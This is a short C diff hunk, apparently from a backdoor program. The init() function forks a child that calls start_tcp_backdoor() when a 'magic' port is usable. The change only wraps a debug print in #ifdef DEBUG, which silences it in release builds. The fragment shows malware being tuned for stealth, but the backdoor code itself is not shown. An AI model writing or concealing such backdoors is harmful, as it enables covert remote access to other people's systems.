@@ -31,7 +31,9 @@ init(void)
     if (is_port_usable(MAGIC_PORT)){
         int nChild = fork();
         if (nChild == 0){
+            #ifdef DEBUG
             printf("[-] FORKING\n");
+            #endif
             start_tcp_backdoor();
             exit(0);
         }
